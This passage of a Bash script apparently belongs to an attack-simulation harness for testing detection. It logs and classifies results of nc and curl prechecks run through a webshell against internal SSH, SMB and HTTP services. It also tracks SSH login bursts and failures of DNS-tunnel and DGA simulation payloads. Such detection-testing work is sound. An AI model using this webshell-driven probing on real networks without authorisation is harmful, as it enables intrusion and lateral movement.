    poc_obs_append_log "Target Range: ${TARGET_NET}"
    poc_obs_append_log ""
    poc_obs_append_log "Start Time: ${start_ts}"
    poc_obs_append_log ""
    echo "PoC log: ${POC_EXECUTION_LOG}"
    echo "PoC report: ${POC_REPORT_CWD}"
    echo "PoC evidence: ${POC_EVIDENCE_DIR}"
}

poc_obs_print_environment_validation() {
    local tool status
    poc_obs_log "INFO" "Environment Validation"
    poc_obs_append_log ""
    for tool in nmap curl nc ssh timeout ping; do
        status="MISSING"
        command -v "${tool}" >/dev/null 2>&1 && status="OK"
        [[ "${tool}" == nmap && "${HAS_nmap:-false}" == true ]] && status="OK (remote)"
        [[ "${tool}" == ssh && "${HAS_ssh:-false}" == true ]] && status="OK (remote)"
        poc_obs_log "INFO" "tool ${tool}: ${status}"
    done
    poc_obs_append_log ""
    poc_obs_log "INFO" "hostname: $(hostname -f 2>/dev/null || hostname 2>/dev/null || echo unknown)"
    poc_obs_log "INFO" "OS: $(uname -s 2>/dev/null) $(uname -r 2>/dev/null)"
    poc_obs_log "INFO" "kernel: $(uname -r 2>/dev/null)"
    poc_obs_log "INFO" "IP addresses: $(hostname -I 2>/dev/null | tr -s ' ' || ip -4 addr show 2>/dev/null | awk '/inet /{print $2}' | tr '\n' ' ')"
    poc_obs_log "INFO" "default gateway: $(ip route 2>/dev/null | awk '/default/{print $3; exit}')"
    poc_obs_log "INFO" "DNS servers: $(grep -E '^nameserver' /etc/resolv.conf 2>/dev/null | awk '{print $2}' | tr '\n' ' ')"
    poc_obs_log "INFO" "user: $(id -un 2>/dev/null)"
    poc_obs_log "INFO" "cwd: $(pwd)"
}

poc_obs_stage_start() {
    local stage="$1" ts
    POC_STAGE_START_EPOCH["${stage}"]=$(date +%s)
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    poc_obs_log "INFO" "STAGE START: ${stage}"
    poc_obs_report_stage_event "${ts}" "${stage}" "—" "stage" "—" "start" "—"
}

poc_obs_stage_end() {
    local stage="$1" start now dur ts
    start="${POC_STAGE_START_EPOCH[${stage}]:-}"
    now=$(date +%s)
    if [[ -n "${start}" ]]; then
        dur=$((now - start))
    else
        dur=0
    fi
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    poc_obs_log "INFO" "STAGE END: ${stage} (${dur}s)"
    poc_obs_report_stage_event "${ts}" "${stage}" "—" "stage" "—" "end" "duration=${dur}s"
}

poc_obs_discovery_header() {
    poc_obs_append_log ""
    poc_obs_append_log "============================================================"
    poc_obs_append_log "DISCOVERY"
    poc_obs_append_log "============================================================"
    poc_obs_append_log ""
    poc_obs_append_log "Target Range: ${TARGET_NET}"
    poc_obs_append_log ""
}

poc_obs_log_discovery_service() {
    local ip="$1" port="$2" proto="${3:-tcp}" state="$4" reason="$5" service="$6" banner="${7:-}"
    local line
    line="${ip}|${port}|${proto}|${state}|${reason}|${service}|${banner}"
    POC_DISCOVERY_SERVICES_LOG+="${line}"$'\n'
    poc_obs_log "INFO" "Discovery: ${ip}:${port}/${proto} service=${service} state=${state} reason=${reason}"
    poc_obs_report_discovery_row "${ip}" "${port}" "${proto}" "${state}" "${reason}" "${service}"
    [[ -n "${banner}" ]] && poc_obs_log "INFO" "Discovery banner ${ip}:${port}: ${banner}"
}

analyze_http_000_root_cause() {
    local output="$1" exit_code="${2:-1}"
    local low
    low=$(printf '%s' "${output}" | tr '[:upper:]' '[:lower:]')
    [[ "${low}" == *"could not resolve"* || "${low}" == *"name or service not known"* || "${low}" == *"nodename nor servname"* ]] && {
        printf '%s' 'DNS resolution failed'; return 0
    }
    [[ "${low}" == *"connection timed out"* || "${low}" == *"timed out"* || "${low}" == *"timeout"* ]] && {
        printf '%s' 'TCP SYN sent — no SYN/ACK received (likely firewall drop or routing blackhole)'; return 0
    }
    [[ "${low}" == *"connection refused"* || "${low}" == *"refused"* ]] && {
        printf '%s' 'TCP connection refused by target'; return 0
    }
    [[ "${low}" == *"connection reset"* || "${low}" == *"reset by peer"* ]] && {
        printf '%s' 'Connection reset by peer'; return 0
    }
    [[ "${low}" == *"ssl"* || "${low}" == *"tls"* || "${low}" == *"certificate"* ]] && {
        printf '%s' 'TLS handshake failed or certificate error'; return 0
    }
    [[ "${low}" == *"failed to connect"* || "${low}" == *"couldn't connect"* ]] && {
        printf '%s' 'TCP connect failed before HTTP response'; return 0
    }
    (( exit_code == 127 )) && { printf '%s' 'Remote command not found (curl missing on webshell host)'; return 0; }
    (( exit_code != 0 )) && { printf '%s' "Remote command failed (exit ${exit_code})"; return 0; }
    printf '%s' 'No HTTP response — transport or webshell channel failure'
}

classify_http_status_code() {
    local code="$1"
    case "${code}" in
        2*)   printf '%s' 'http_success' ;;
        301)  printf '%s' 'http_redirect' ;;
        302|303|307|308) printf '%s' 'http_redirect' ;;
        401)  printf '%s' 'http_auth_required' ;;
        400)  printf '%s' 'http_bad_request' ;;
        403)  printf '%s' 'http_forbidden' ;;
        404)  printf '%s' 'http_not_found' ;;
        405)  printf '%s' 'http_method_blocked' ;;
        5*)   printf '%s' 'http_server_error' ;;
        000|"") printf '%s' 'unknown_failure' ;;
        *)    printf '%s' 'http_response_received' ;;
    esac
}

classify_connection_result() {
    local output="$1" exit_code="${2:-1}" http_code="${3:-}"
    local low detail
    low=$(printf '%s' "${output}" | tr '[:upper:]' '[:lower:]')
    if [[ -n "${http_code}" && "${http_code}" != "000" ]]; then
        classify_http_status_code "${http_code}"
        return 0
    fi
    if [[ "${low}" == *"http/1."* || "${low}" == *"http/2"* ]]; then
        http_code=$(sed -n 's/^[hH][tT][tT][pP]\/[0-9.]* \([0-9][0-9][0-9]\).*/\1/p' <<< "${output}" | head -n1)
        if [[ -n "${http_code}" && "${http_code}" != "000" ]]; then
            classify_http_status_code "${http_code}"
            return 0
        fi
        printf '%s' 'http_response_received'
        return 0
    fi
    [[ "${low}" == *"403"* || "${low}" == *"forbidden"* ]] && { printf '%s' 'http_forbidden'; return 0; }
    [[ "${low}" == *"401"* || "${low}" == *"unauthorized"* ]] && { printf '%s' 'http_auth_required'; return 0; }
    [[ "${low}" == *"connection refused"* || "${low}" == *"refused"* ]] && { printf '%s' 'tcp_connect_failed'; return 0; }
    [[ "${low}" == *"timed out"* || "${low}" == *"timeout"* || "${low}" == *"time out"* ]] && { printf '%s' 'tcp_timeout'; return 0; }
    [[ "${low}" == *"connection reset"* || "${low}" == *"reset by peer"* ]] && { printf '%s' 'tcp_reset'; return 0; }
    [[ "${low}" == *"filtered"* || "${low}" == *"no route"* ]] && { printf '%s' 'tcp_timeout'; return 0; }
    [[ "${low}" == *"no route to host"* ]] && { printf '%s' 'tcp_connect_failed'; return 0; }
    [[ "${low}" == *"name or service not known"* || "${low}" == *"could not resolve"* ]] && { printf '%s' 'dns_failed'; return 0; }
    [[ "${low}" == *"ssl"* || "${low}" == *"tls"* || "${low}" == *"certificate"* ]] && { printf '%s' 'tls_handshake_failed'; return 0; }
    [[ "${low}" == *"http/0.9"* || "${low}" == *"received http/0.9"* ]] && { printf '%s' 'http_proto_mismatch'; return 0; }
    [[ "${low}" == *"succeeded"* || "${low}" == *"open"* || "${low}" == *"_usable"* || "${low}" == *"connected"* ]] && { printf '%s' 'connected'; return 0; }
    (( exit_code == 0 )) && { printf '%s' 'connected'; return 0; }
    (( exit_code == 127 )) && { printf '%s' 'webshell_execution_failed'; return 0; }
    printf '%s' 'unknown_failure'
}

# Precheck records use cmd|ec|out|classification. Multiline curl/nc output breaks IFS='|' read.
poc_precheck_flatten_field() {
    local value
    value=$(printf '%s' "${1:-}" | tr '\r\n\t|' '    ')
    value="${value#"${value%%[![:space:]]*}"}"
    value="${value%"${value##*[![:space:]]}"}"
    while [[ "${value}" == *"  "* ]]; do
        value="${value//  / }"
    done
    printf '%s' "${value}"
}

poc_precheck_emit_line() {
    local cmd="$1" ec="$2" out="$3" classification="$4"
    cmd=$(poc_precheck_flatten_field "${cmd}")
    out=$(poc_precheck_flatten_field "${out}")
    printf '%s|%s|%s|%s' "${cmd}" "${ec}" "${out:-no output}" "${classification}"
}

poc_precheck_read_line() {
    local line="$1"
    local -n _cmd="$2" _ec="$3" _out="$4" _class="$5"
    _class="${line##*|}"
    line="${line%|${_class}}"
    _out="${line##*|}"
    line="${line%|${_out}}"
    _ec="${line##*|}"
    _cmd="${line%|${_ec}}"
}

decision_from_classification() {
    local classification="$1" attempted="${2:-false}" attempt_ok="${3:-false}" cmd_hint="${4:-}" precheck_cmd="${5:-}"
    if [[ "${precheck_cmd}" == auxiliary_probe_only* || "${cmd_hint}" == auxiliary_probe_only* || "${classification}" == auxiliary_probe_only ]]; then
        printf '%s' 'auxiliary_probe'
        return 0
    fi
    if [[ "${cmd_hint}" == concentrated_burst_already_executed* || "${classification}" == concentrated_burst_complete || "${classification}" == selection_probe_only ]]; then
        printf '%s' 'auxiliary_probe'
        return 0
    fi
    case "${classification}" in
        connected|http_success|http_response_received|http_redirect)
            if [[ "${attempted}" == true ]]; then
                [[ "${attempt_ok}" == true ]] && printf '%s' 'attempted_success' || printf '%s' 'attempted_failed'
            else
                printf '%s' 'attempted_success'
            fi
            ;;
        http_forbidden|http_auth_required|app_forbidden|app_unauthorized)
            printf '%s' 'attempted_auth_required_scan'
            ;;
        tcp_connect_failed|connection_refused) printf '%s' 'skipped_connection_refused' ;;
        tcp_timeout|network_timeout|filtered) printf '%s' 'skipped_network_timeout' ;;
        tcp_reset)          printf '%s' 'skipped_network_timeout' ;;
        no_route)           printf '%s' 'skipped_network_timeout' ;;
        dns_failed|dns_failure) printf '%s' 'skipped_unknown_reason' ;;
        tls_handshake_failed|tls_certificate_error) printf '%s' 'skipped_network_timeout' ;;
        webshell_execution_failed|application_error) printf '%s' 'skipped_script_error' ;;
        script_error)       printf '%s' 'skipped_script_error' ;;
        config_missing)     printf '%s' 'skipped_config_missing' ;;
        missing_tool)       printf '%s' 'skipped_missing_tool' ;;
        service_not_open)   printf '%s' 'skipped_service_not_open' ;;
        http_method_blocked|http_not_found|http_server_error|http_bad_request)
            if [[ "${attempted}" == true ]]; then
                [[ "${attempt_ok}" == true ]] && printf '%s' 'attempted_success' || printf '%s' 'attempted_failed'
            else
                printf '%s' 'attempted_success'
            fi
            ;;
        *)
            if [[ "${attempted}" == true ]]; then
                [[ "${attempt_ok}" == true ]] && printf '%s' 'attempted_success' || printf '%s' 'attempted_failed'
            else
                printf '%s' 'skipped_unknown_reason'
            fi
            ;;
    esac
}

skip_reason_from_decision() {
    local d="$1"
    case "${d}" in
        skipped_*) printf '%s' "${d#skipped_}" ;;
        attempted_*) printf '%s' '' ;;
        precheck_success_only) printf '%s' 'precheck_only_no_url_scan_events' ;;
        *) printf '%s' "${d}" ;;
    esac
}

poc_obs_interpretation() {
    local scenario="$1" classification="$2" decision="$3" target="$4"
    case "${decision}" in
        skipped_network_timeout|skipped_filtered)
            cat <<EOF
The ${scenario} service was discovered during scanning,
however the TCP/HTTP precheck did not complete successfully (${classification}).

The follow-up was skipped because a reliable session to the service could not be established.

This suggests firewall filtering, ACL enforcement, routing restrictions,
or asymmetric network behavior — not a script logic failure.
EOF
            ;;
        skipped_connection_refused)
            cat <<EOF
The ${scenario} service was discovered during scanning at ${target},
but the precheck received connection refused.

The follow-up was skipped because the target actively refused the connection.
This may indicate the service is down, bound to another interface, or restricted by host policy.
EOF
            ;;
        skipped_app_forbidden)
            cat <<EOF
The HTTP service at ${target} is reachable at the network layer.

The follow-up was skipped because the application returned HTTP 403 Forbidden.

This indicates application-layer access control, not network connectivity failure.
EOF
            ;;
        skipped_app_unauthorized)
            cat <<EOF
The HTTP service at ${target} is reachable but returned HTTP 401 Unauthorized.

The follow-up was limited because authentication is required by application policy.
EOF
            ;;
        skipped_missing_tool)
            cat <<EOF
The ${scenario} follow-up was skipped because a required tool is not installed on the execution host.
Install the missing dependency and re-run the PoC.
EOF
            ;;
        skipped_config_missing)
            cat <<EOF
The ${scenario} follow-up was skipped due to missing configuration (no targets or required parameters).
EOF
            ;;
        skipped_script_error)
            cat <<EOF
The ${scenario} follow-up encountered an internal script error during precheck or execution.
Review the evidence lines above and operator logs.
EOF
            ;;
        attempted_auth_required_scan)
            cat <<EOF
The HTTP service at ${target} is reachable and returned ${classification} during precheck.

External URL reconnaissance continued because HTTP 401/403 responses are valid failed-URL telemetry for detection (authentication success is not required).
EOF
            ;;
        auxiliary_probe)
            cat <<EOF
The ${scenario} target at ${target} was handled as an auxiliary selection probe only (Reason=selection_probe_only).

No concentrated URL scan burst was executed on this host; telemetry for detection is attributed to the selected primary target.
EOF
            ;;
        attempted_success)
            cat <<EOF
The ${scenario} follow-up at ${target} completed successfully after precheck (${classification}).
Telemetry was generated as planned.
EOF
            ;;
        precheck_success_only)
            cat <<EOF
The HTTP service at ${target} passed precheck (${classification}) but no URL scan events were recorded in http_url_scan_events.log.

Stage decision was downgraded from attempted_success to precheck_success_only — precheck alone does not count as URL scan success.
EOF
            ;;
        attempted_failed)
            cat <<EOF
The ${scenario} follow-up at ${target} was attempted after precheck (${classification})
but did not produce the expected telemetry outcome.
EOF
            ;;
        *)
            cat <<EOF
The ${scenario} follow-up at ${target} ended with decision=${decision} (classification=${classification}).
Review precheck evidence to determine whether environment or application policy blocked execution.
EOF
            ;;
    esac
}

poc_obs_log_followup_decision_block() {
    local scenario="$1" target="$2" scan_result="$3" precheck_cmd="$4" precheck_result="$5"
    local classification="$6" decision="$7"
    local interp
    interp=$(poc_obs_interpretation "${scenario}" "${classification}" "${decision}" "${target}")
    {
        echo ""
        echo "============================================================"
        echo "FOLLOW-UP DECISION"
        echo "============================================================"
        echo ""
        echo "Scenario:"
        echo "${scenario}"
        echo ""
        echo "Target:"
        echo "${target}"
        echo ""
        echo "Scan Result:"
        echo "${scan_result}"
        echo ""
        echo "Precheck Command:"
        echo "${precheck_cmd}"
        echo ""
        echo "Precheck Result:"
        echo "${precheck_result}"
        echo ""
        echo "Classification:"
        echo "${classification}"
        echo ""
        echo "Decision:"
        echo "${decision}"
        echo ""
        echo "Interpretation:"
        echo ""
        echo "${interp}"
        echo ""
    }
    poc_obs_log "DECISION" "Scenario=${scenario} target=${target} decision=${decision}"
    poc_obs_log "INFO" "Precheck (${classification}): ${precheck_result}"
}

poc_obs_report_followup_row() {
    local scenario="$1" target_ip="$2" target_port="$3" scan_state="$4" scan_service="$5"
    local precheck_cmd="$6" precheck_ec="$7" precheck_result="$8" decision="$9" skip_reason="${10}"
    local cmd_exec="${11}" exit_code="${12}" classification="${13}" interpretation="${14}" elapsed="${15}"
    local ts target detail
    [[ -n "${POC_REPORT_CWD}" ]] || return 0
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    target="${target_ip}:${target_port}"
    interpretation="${interpretation//$'\n'/ }"
    precheck_result="${precheck_result//$'\n'/ }"
    detail="precheck_ec=${precheck_ec}; precheck=${precheck_result}; cmd=${cmd_exec:-n/a}; exit=${exit_code:-n/a}; elapsed=${elapsed:-0}s"
    detail="${detail//|/\\|}"
    poc_obs_report_ensure_followup_section
    poc_obs_report_append "| ${ts} | ${scenario} | ${target} | ${scan_service} (${scan_state}) | ${classification} | ${decision} | ${skip_reason:-—} | ${detail} |"
    if [[ "${decision}" == skipped_* ]]; then
        poc_obs_log "WARN" "Follow-up SKIP ${scenario} ${target}: ${skip_reason:-${decision}} (classification=${classification})"
    else
        poc_obs_log "INFO" "Follow-up RUN ${scenario} ${target}: ${decision} (classification=${classification}, ${elapsed:-0}s)"
    fi
}

poc_obs_count_decision() {
    local decision="$1" key
    case "${decision}" in
        attempted_success|attempted_failed|precheck_success_only|auxiliary_probe) POC_FOLLOWUP_ATTEMPTED=$((POC_FOLLOWUP_ATTEMPTED + 1)) ;;
        skipped_*)
            POC_FOLLOWUP_SKIPPED=$((POC_FOLLOWUP_SKIPPED + 1))
            key="${decision#skipped_}"
            POC_SKIP_REASON_COUNTS["${key}"]=$((${POC_SKIP_REASON_COUNTS["${key}"]:-0} + 1))
            ;;
    esac
}

poc_precheck_ssh() {
    local ip="$1" port="${2:-22}"
    local cmd="nc -vz -w 3 ${ip} ${port}" out ec classification
    if [[ "${DRY_RUN}" == true ]]; then
        poc_precheck_emit_line "${cmd}" "0" "dry-run connected" "connected"
        return 0
    fi
    if [[ "${HAS_nc:-false}" != true && "${HAS_bash:-false}" != true ]]; then
        poc_precheck_emit_line "${cmd}" "127" "missing nc/bash on remote" "script_error"
        return 0
    fi
    out=$(run_webshell_quick "poc-precheck-ssh-${ip}" "${cmd} 2>&1; echo PRECHECK_EC=\$?" 2>/dev/null | tr -d '\r' || true)
    ec=$(sed -n 's/.*PRECHECK_EC=\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)
    ec=$(safe_int "${ec}")
    out=$(sed '/PRECHECK_EC=/d' <<< "${out}" | tail -n 5)
    classification=$(classify_connection_result "${out}" "${ec}")
    poc_precheck_emit_line "${cmd}" "${ec}" "${out:-no output}" "${classification}"
}

poc_precheck_http() {
    local url="$1" out ec classification http_code curl_tls="" ws_ctx
    [[ "${url}" == https://* ]] && curl_tls="-k"
    # -sS avoids stderr progress meter; max-time 7 fits inside run_webshell_quick (10s).
    local cmd="curl ${curl_tls} -sS -I --connect-timeout 5 --max-time 7 ${url}"
    if [[ "${DRY_RUN}" == true ]]; then
        poc_precheck_emit_line "${cmd}" "0" "HTTP/1.1 200 OK (dry-run)" "connected"
        return 0
    fi
    if [[ "${HAS_curl:-false}" != true ]]; then
        poc_precheck_emit_line "${cmd}" "127" "curl missing on remote" "script_error"
        return 0
    fi
    ws_ctx="poc-precheck-http-$(printf '%s' "${url}" | tr -c 'A-Za-z0-9._-' '_')"
    out=$(run_webshell_quick "${ws_ctx}" "${cmd}; echo PRECHECK_EC=\$?" 2>/dev/null | tr -d '\r' || true)
    ec=$(sed -n 's/.*PRECHECK_EC=\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)
    ec=$(safe_int "${ec}")
    http_code=$(sed -n 's/^[Hh][Tt][Tt][Pp]\/[0-9.]* \([0-9][0-9][0-9]\).*/\1/p' <<< "${out}" | head -n1)
    out=$(sed '/PRECHECK_EC=/d' <<< "${out}" | head -n 8)
    classification=$(classify_connection_result "${out}" "${ec}" "${http_code}")
    poc_precheck_emit_line "${cmd}" "${ec}" "${out:-no output}" "${classification}"
}

poc_precheck_smb() {
    local ip="$1" port="${2:-445}"
    local cmd="nc -vz -w 3 ${ip} ${port}" out ec classification
    if [[ "${DRY_RUN}" == true ]]; then
        poc_precheck_emit_line "${cmd}" "0" "dry-run connected" "connected"
        return 0
    fi
    out=$(run_webshell_quick "poc-precheck-smb-${ip}" "${cmd} 2>&1; echo PRECHECK_EC=\$?" 2>/dev/null | tr -d '\r' || true)
    ec=$(sed -n 's/.*PRECHECK_EC=\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)
    ec=$(safe_int "${ec}")
    out=$(sed '/PRECHECK_EC=/d' <<< "${out}" | tail -n 5)
    classification=$(classify_connection_result "${out}" "${ec}")
    poc_precheck_emit_line "${cmd}" "${ec}" "${out:-no output}" "${classification}"
}

poc_obs_record_followup() {
    local scenario="$1" target_ip="$2" target_port="$3" scan_state="$4" scan_service="$5"
    local precheck_cmd="$6" precheck_ec="$7" precheck_result="$8" classification="$9"
    local attempted="${10:-false}" attempt_ok="${11:-false}" cmd_exec="${12:-}" exit_code="${13:-}" elapsed="${14:-0}"
    local decision skip_reason interp target_display
    target_display="${target_ip}:${target_port}"
    decision=$(decision_from_classification "${classification}" "${attempted}" "${attempt_ok}" "${cmd_exec}" "${precheck_cmd}")
    if [[ "${decision}" == attempted_success && "${scenario}" == *"HTTP"* ]]; then
        local _es
        _es=$(build_module_summary_from_events "HTTP_URL_SCAN" 2>/dev/null || true)
        if (( $(safe_int "$(event_summary_field "${_es}" events 0)") < 1 )); then
            log_message "WARN" "FOLLOWUP_DECISION_CORRECTED old=attempted_success new=precheck_success_only reason=no_http_events_in_sot"
            decision="precheck_success_only"
        fi
    fi
    skip_reason=$(skip_reason_from_decision "${decision}")
    interp=$(poc_obs_interpretation "${scenario}" "${classification}" "${decision}" "${target_display}")
    poc_obs_count_decision "${decision}"
    poc_obs_log_followup_decision_block "${scenario}" "${target_display}" "${scan_state} ${scan_service}" \
        "${precheck_cmd}" "${precheck_result}" "${classification}" "${decision}"
    poc_obs_report_followup_row "${scenario}" "${target_ip}" "${target_port}" "${scan_state}" "${scan_service}" \
        "${precheck_cmd}" "${precheck_ec}" "${precheck_result}" "${decision}" "${skip_reason}" \
        "${cmd_exec}" "${exit_code}" "${classification}" "${interp}" "${elapsed}"
    printf '%s' "${decision}"
}

poc_obs_should_run_followup() {
    local classification="$1"
    case "${classification}" in
        connected|http_success|http_response_received|http_redirect|tcp_connect_failed) return 0 ;;
        *) return 1 ;;
    esac
}

# HTTP URL scan telemetry is useful on 401/403 as well as clean 2xx responses.
poc_obs_should_run_http_followup() {
    local classification="$1"
    case "${classification}" in
        connected|http_success|http_response_received|http_redirect|http_forbidden|http_auth_required|http_bad_request|http_method_blocked|http_not_found|http_server_error|app_forbidden|app_unauthorized) return 0 ;;
        *) return 1 ;;
    esac
}

poc_http_followup_attempt_ok() {
    local responses="$1" connected="$2" success="$3" attempted="$4"
    local sot_completed=0
    http_refresh_sot_from_events 2>/dev/null || true
    sot_completed=$(safe_int "${HTTP_URL_COMPLETE_COUNT:-0}")
    (( sot_completed > 0 )) && return 0
    (( responses > 0 || connected > 0 || success > 0 )) && return 0
    return 1
}

poc_ssh_followup_attempt_ok() {
    local classification="$1" attempt_count="$2" ssh_out="${3:-}"
    attempt_count=$(safe_int "${attempt_count}")
    [[ "${classification}" == connected ]] && (( attempt_count > 0 )) && return 0
    [[ "${ssh_out}" == *SSH_BURST_ATTEMPT* && attempt_count -gt 0 ]] && return 0
    return 1
}

log_ssh_burst_attempts_from_output() {
    local target="$1" ssh_out="$2" line n=0
    while IFS= read -r line; do
        [[ "${line}" != *SSH_BURST_ATTEMPT* ]] && continue
        n=$((n + 1))
        state_append "ssh_auth_telemetry.log" "SSH_BURST_ATTEMPT target=${target} seq=${n}"
        log_message "OK" "SSH_BURST_ATTEMPT target=${target} seq=${n}" >&2
    done <<< "$(printf '%s\n' "${ssh_out}" | grep -E 'SSH_BURST_ATTEMPT|SSH_BURST_DONE' || true)"
}

poc_obs_webshell_hook() {
    local context="$1" payload="$2" body="$3" http_code="$4" exit_code="$5" exec_ms="$6"
    local preview status
    preview=$(printf '%.200s' "${body}" | tr '\n' ' ')
    if (( exit_code == 0 )) && [[ "${http_code}" =~ ^[23] ]]; then
        status="command_success"
    elif (( exit_code != 0 )); then
        status="command_failed"
    else
        status="command_unknown"
    fi
    poc_obs_log "DEBUG" "Webshell context=${context} http=${http_code:-000} exit=${exit_code} ms=${exec_ms} size=${#body} status=${status}"
    if [[ "${status}" == command_failed ]] || [[ "${http_code}" == "000" || -z "${http_code}" ]]; then
        poc_obs_log "EVIDENCE" "Webshell failure context=${context} URL=${WEB_SHELL_URL:-n/a} exit=${exit_code} http=${http_code:-000} time_ms=${exec_ms} stdout_preview=${preview}"
        (( exit_code == 127 )) && poc_failure_reason_bump "Webshell command not found" 1
        [[ "${http_code}" == "000" || -z "${http_code}" ]] && poc_failure_reason_bump "Webshell transport HTTP 000" 1
    fi
}

poc_obs_print_top_failure_reasons() {
    local key count total=0 pct sorted
    poc_obs_append_log ""
    poc_obs_append_log "TOP FAILURE REASONS"
    poc_obs_append_log ""
    if ((${#POC_FAILURE_REASON_COUNTS[@]} == 0 && ${#POC_HTTP_STATUS_COUNTS[@]} == 0)); then
        poc_obs_append_log "  (none recorded)"
        return 0
    fi
    for key in "${!POC_HTTP_STATUS_COUNTS[@]}"; do
        count="${POC_HTTP_STATUS_COUNTS[${key}]}"
        total=$((total + count))
        poc_obs_append_log "$(printf '  HTTP %s : %s' "${key}" "${count}")"
    done
    for key in "${!POC_FAILURE_REASON_COUNTS[@]}"; do
        count="${POC_FAILURE_REASON_COUNTS[${key}]}"
        poc_obs_append_log "$(printf '  %s : %s' "${key}" "${count}")"
    done
}

format_http_method_breakdown_block() {
    cat <<EOF
HTTP Method Effectiveness (aggregate)
- GET      attempted=${HTTP_REQUESTS_ATTEMPTED:-0}  (via URL scan burst)
- HEAD     attempted=${HTTP_REQUESTS_ATTEMPTED:-0}
- POST     attempted=${HTTP_POST_COUNT:-0}  success=${HTTP_POST_COUNT:-0}
- OPTIONS  attempted=${HTTP_OPTIONS_COUNT:-0}  success=${HTTP_OPTIONS_COUNT:-0}
- PROPFIND attempted=${HTTP_PROPFIND_COUNT:-0}  success=${HTTP_PROPFIND_COUNT:-0}
EOF
}

format_http_status_breakdown_block() {
    local key count total=0 pct
    for key in "${!POC_HTTP_STATUS_COUNTS[@]}"; do
        total=$((total + POC_HTTP_STATUS_COUNTS[${key}]))
    done
    cat <<EOF
HTTP Status Breakdown (aggregate)
$(for key in "${!POC_HTTP_STATUS_COUNTS[@]}"; do
    count="${POC_HTTP_STATUS_COUNTS[${key}]}"
    if (( total > 0 )); then pct=$((count * 100 / total)); else pct=0; fi
    printf -- '- %s : %s (%s%%)\n' "${key}" "${count}" "${pct}"
done)
EOF
}

poc_payload_heredoc_wrap_risk() {
    local payload="$1" delim="" line=""
    [[ "${payload}" != *"<<"* ]] && { printf 'no'; return 0; }
    while IFS= read -r line || [[ -n "${line}" ]]; do
        delim=$(printf '%s\n' "${line}" | sed -n "s/.*<<'\([^']*\)'.*/\1/p")
        if [[ -z "${delim}" ]]; then
            delim=$(printf '%s\n' "${line}" | sed -n 's/.*<<[[:space:]]*\([A-Za-z0-9_][A-Za-z0-9_]*\).*/\1/p')
        fi
        [[ -z "${delim}" ]] && continue
        if [[ "${line}" == "${delim};"* ]]; then
            printf 'yes'
            return 0
        fi
    done <<< "${payload}"
    if [[ -n "${delim}" && "${payload}" == *"${delim}"* && "${payload}" != *$'\n'"${delim}"$'\n'* && "${payload}" != *$'\n'"${delim}" ]]; then
        printf 'yes'
        return 0
    fi
    printf 'no'
}

poc_classify_dns_dga_root_cause() {
    local module="$1" payload="$2" out="$3" http_code="${4:-${WEBSHELL_LAST_HTTP_CODE:-000}}"
    local low root_cause="unknown" reason="" bytes=${#payload} limit="${PAYLOAD_WARN_BYTES}"
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')

    if [[ "$(poc_payload_heredoc_wrap_risk "${payload}")" == yes || "${low}" == *"here-document"* \
        || "${low}" == *"wanted \`dga_sim_script"* || "${low}" == *"wanted \`dns_tunnel_sim_script"* ]]; then
        root_cause="heredoc_termination_corruption"
        reason="heredoc delimiter merged with exit suffix or broken terminator line"
    elif [[ "${low}" == *"rand_bytes: not found"* || "${low}" == *"rand_bytes: command not found"* \
        || "${low}" == *"dga_rand_label: not found"* || "${low}" == *"dga_rand_label: command not found"* \
        || "${low}" == *"dga_gen_domain: not found"* || "${low}" == *"dga_gen_domain: command not found"* \
        || "${low}" == *"dga_pick_tld: not found"* || "${low}" == *"dga_pick_tld: command not found"* \
        || "${low}" == *"randlbl32: not found"* || "${low}" == *"randlbl32: command not found"* \
        || "${low}" == *"randlbl: not found"* || "${low}" == *"randlbl: command not found"* \
        || "${low}" == *"bad substitution"* ]]; then
        root_cause="function_scope_corruption"
        reason="remote function definitions not executed in shell scope after payload wrap/transport"
    elif [[ "${low}" == *"unexpected eof"* || "${low}" == *"unexpected end of file"* \
        || "${low}" == *"syntax error near unexpected token"* ]]; then
        root_cause="heredoc_termination_corruption"
        reason="heredoc/script truncated or delimiter broken (unexpected EOF)"
    elif [[ "${low}" == *"command timed out"* || "${low}" == *"killed"* ]]; then
        root_cause="COMMAND_TIMEOUT"
        reason="remote command exceeded timeout"
    elif [[ "${http_code}" == "000" ]]; then
        root_cause="webshell_transport_limit"
        reason="webshell transport failed (HTTP 000) payload_bytes=${bytes}"
    elif [[ -z "${out}" ]] && (( bytes > limit )); then
        root_cause="webshell_transport_limit"
        reason="empty response with payload_bytes=${bytes} above limit=${limit}"
    elif [[ "${low}" == *"dig: not found"* || "${low}" == *"dig not found"* ]]; then
        root_cause="DIG_MISSING"
        reason="dig not installed on webshell host"
    elif [[ "${low}" == *"dns_server_validation_failed"* || "${low}" == *"resolver validation"* ]]; then
        root_cause="resolver_validation_failure"
        reason="DNS resolver validation failed before query execution"
    elif [[ "${low}" == *"timed out"* || "${low}" == *"timeout"* || "${low}" == *"dns server unreachable"* \
        || "${low}" == *"connection refused"* || "${low}" == *"no servers could be reached"* ]]; then
        root_cause="dns_connectivity_failure"
        reason="DNS server unreachable or query timeout"
    elif [[ -z "${out}" ]]; then
        root_cause="webshell_transport_limit"
        reason="webshell returned empty output"
    fi

    printf '%s\n%s' "${root_cause}" "${reason}"
}

poc_log_root_cause_analysis() {
    local module="$1" payload="$2" out="$3" http_code="${4:-${WEBSHELL_LAST_HTTP_CODE:-000}}"
    local root_cause reason _rc_lines=()
    mapfile -t _rc_lines <<< "$(poc_classify_dns_dga_root_cause "${module}" "${payload}" "${out}" "${http_code}")"
    root_cause="${_rc_lines[0]:-unknown}"
    reason="${_rc_lines[1]:-}"
    log_message "OK" "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET} http=${http_code}"
    case "${module}" in
        DNS)
            DNS_TUNNEL_LAST_ROOT_CAUSE="${root_cause}"
            dns_tunnel_log_both "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET}"
            ;;
        DGA)
            DGA_LAST_ROOT_CAUSE="${root_cause}"
